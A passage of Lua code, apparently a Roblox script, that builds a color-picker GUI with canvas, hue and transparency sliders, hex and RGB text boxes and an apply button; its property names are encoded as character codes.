_llza[_sc(52,48,52)][_sc(84,101,120,116)]=[[--]];
_llza[_sc(52,48,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,52)][_sc(90,73,110,100,101,120)]=999999999;
_llza[_sc(52,48,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,48,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,48,52)]);
_llza[_sc(52,48,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,48,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,48,52)]);
_llza[_sc(52,48,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(52,48,55)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,48,48)]);
_llza[_sc(52,48,55)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(52,48,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,48)]);
_llza[_sc(52,48,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 180);
_llza[_sc(52,48,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(52,48,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,56)][_sc(78,97,109,101)]=[[canvashue]];
_llza[_sc(52,48,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,56)]);
_llza[_sc(52,48,57)][_sc(83,105,122,101)]=UDim2.new(1, -20, 1, 0);
_llza[_sc(52,48,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,57)][_sc(78,97,109,101)]=[[canvasFrame]];
_llza[_sc(52,48,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,97)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,48,57)]);
_llza[_sc(52,48,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,48,97)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,48,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,48,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,48,97)][_sc(78,97,109,101)]=[[canvas]];
_llza[_sc(52,48,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,97)]);
_llza[_sc(52,48,98)][_sc(90,73,110,100,101,120)]=999999999;
_llza[_sc(52,48,98)][_sc(83,105,122,101)]=UDim2.new(0, 4, 0, 4);
_llza[_sc(52,48,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,98)][_sc(78,97,109,101)]=[[dot]];
_llza[_sc(52,48,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.5, 0, 0.5, 0);
_llza[_sc(52,48,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,48,99)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(52,48,98)]);
_llza[_sc(52,48,99)][_sc(67,111,114,110,101,114,82,97,100,105,117,115)]=UDim.new(0, 999);
_llza[_sc(52,48,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,48,98)]);
_llza[_sc(52,48,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,48,57)]);
_llza[_sc(52,48,101)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(52,48,101)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(52,48,101)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,48,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(52,48,102)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,56)]);
_llza[_sc(52,48,102)][_sc(83,105,122,101)]=UDim2.new(0, 20, 1, 0);
_llza[_sc(52,48,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,48,102)][_sc(78,97,109,101)]=[[hueFrame]];
_llza[_sc(52,48,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,48,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,48,102)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -20, 0, 0);
_llza[_sc(52,48,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,48)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,48,102)]);
_llza[_sc(52,49,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,48)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,49,48)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49,48)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,49,48)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,49,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,48)][_sc(78,97,109,101)]=[[hue]];
_llza[_sc(52,49,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,49,48)]);
_llza[_sc(52,49,49)][_sc(90,73,110,100,101,120)]=999999999;
_llza[_sc(52,49,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 1);
_llza[_sc(52,49,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,49)][_sc(78,97,109,101)]=[[line]];
_llza[_sc(52,49,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.5, 0);
_llza[_sc(52,49,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,50)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,49,49)]);
_llza[_sc(52,49,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,48,102)]);
_llza[_sc(52,49,51)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(52,49,51)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(52,49,51)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,49,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(52,49,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,48)]);
_llza[_sc(52,49,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 18);
_llza[_sc(52,49,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=3;
_llza[_sc(52,49,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,52)][_sc(78,97,109,101)]=[[transparency]];
_llza[_sc(52,49,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,49,52)]);
_llza[_sc(52,49,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,49,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,53)][_sc(78,97,109,101)]=[[transparencyFrame]];
_llza[_sc(52,49,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,54)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,49,53)]);
_llza[_sc(52,49,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,49,54)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,49,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,49,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,54)][_sc(78,97,109,101)]=[[slider]];
_llza[_sc(52,49,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,49,54)]);
_llza[_sc(52,49,55)][_sc(90,73,110,100,101,120)]=999999999;
_llza[_sc(52,49,55)][_sc(83,105,122,101)]=UDim2.new(0, 1, 1, 0);
_llza[_sc(52,49,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,55)][_sc(78,97,109,101)]=[[line]];
_llza[_sc(52,49,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,49,55)]);
_llza[_sc(52,49,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,49,53)]);
_llza[_sc(52,49,57)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 1);
_llza[_sc(52,49,57)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 1);
_llza[_sc(52,49,57)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,49,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(52,49,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,48)]);
_llza[_sc(52,49,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(52,49,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=4;
_llza[_sc(52,49,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,97)][_sc(78,97,109,101)]=[[colorvalue]];
_llza[_sc(52,49,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,49,97)]);
_llza[_sc(52,49,98)][_sc(83,105,122,101)]=UDim2.new(1, -100, 1, 0);
_llza[_sc(52,49,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,98)][_sc(78,97,109,101)]=[[hex]];
_llza[_sc(52,49,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,49,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,49,98)]);
_llza[_sc(52,49,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(52,49,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(52,49,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,49,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(52,49,100)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(52,49,98)]);
_llza[_sc(52,49,100)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(201, 201, 201);
_llza[_sc(52,49,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(52,49,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,49,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(52,49,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(52,49,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,49,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,49,100)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[Hex color]];
_llza[_sc(52,49,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,49,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,49,100)][_sc(84,101,120,116)]=[[]];
_llza[_sc(52,49,100)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(52,49,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,49,100)]);
_llza[_sc(52,49,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(52,49,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(52,49,101)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(52,49,101)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(52,49,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,49,100)]);
_llza[_sc(52,49,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,49,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,49,102)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,49,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,49,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,50,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,49,102)]);
_llza[_sc(52,50,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,50,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,50,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,49,100)]);
_llza[_sc(52,50,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,50,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,49,100)]);
_llza[_sc(52,50,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(52,50,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,49,97)]);
_llza[_sc(52,50,51)][_sc(83,105,122,101)]=UDim2.new(1, -100, 1, 0);
_llza[_sc(52,50,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(52,50,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,50,51)][_sc(78,97,109,101)]=[[rgb]];
_llza[_sc(52,50,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,50,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,50,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,50,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,50,51)]);
_llza[_sc(52,50,52)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(52,50,52)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(52,50,52)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,50,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(52,50,53)]=Instance.new(_sc(84,101,120,116,66,111,120),_llza[_sc(52,50,51)]);
_llza[_sc(52,50,53)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(52,50,53)][_sc(80,108,97,99,101,104,111,108,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(201, 201, 201);
_llza[_sc(52,50,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(52,50,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,50,53)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(52,50,53)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(52,50,53)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,50,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,50,53)][_sc(80,108,97,99,101,104,111,108,100,101,114,84,101,120,116)]=[[RGB color]];
_llza[_sc(52,50,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,50,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,50,53)][_sc(84,101,120,116)]=[[]];
_llza[_sc(52,50,53)][_sc(78,97,109,101)]=[[textbox]];
_llza[_sc(52,50,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,50,53)]);
_llza[_sc(52,50,54)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(52,50,54)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(52,50,54)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(52,50,54)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(52,50,55)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,50,53)]);
_llza[_sc(52,50,55)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,50,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,50,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,50,55)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,50,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,50,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,50,56)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,50,55)]);
_llza[_sc(52,50,56)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,50,56)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,50,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,50,53)]);
_llza[_sc(52,50,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,50,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,50,53)]);
_llza[_sc(52,50,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(52,50,98)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,49,97)]);
_llza[_sc(52,50,98)][_sc(70,105,108,108,68,105,114,101,99,116,105,111,110)]=Enum.FillDirection.Horizontal;
_llza[_sc(52,50,98)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(52,50,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,48,48)]);
_llza[_sc(52,50,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(52,50,99)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(52,50,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,50,99)][_sc(78,97,109,101)]=[[applycancel]];
_llza[_sc(52,50,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,50,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,50,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,50,100)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,50,99)]);
_llza[_sc(52,50,100)][_sc(70,105,108,108,68,105,114,101,99,116,105,111,110)]=Enum.FillDirection.Horizontal;
_llza[_sc(52,50,100)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(52,50,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,50,99)]);
_llza[_sc(52,50,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,50,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,50,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,50,101)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,50,101)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,50,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,50,101)][_sc(83,105,122,101)]=UDim2.new(0, 100, 1, 0);
_llza[_sc(52,50,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,50,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,50,101)][_sc(78,97,109,101)]=[[apply]];
_llza[_sc(52,50,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,50,101)]);
_llza[_sc(52,50,102)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(52,50,102)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(52,50,102)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,50,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(52,51,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,50,101)]);
_llza[_sc(52,51,48)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(52,51,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,51,48)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(52,51,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(52,51,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,51,48)]);
_llza[_sc(52,51,49)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(52,51,49)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(52,51,49)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(52,51,50)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(52,50,101)]);
_llza[_sc(52,51,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,51,50)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,51,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
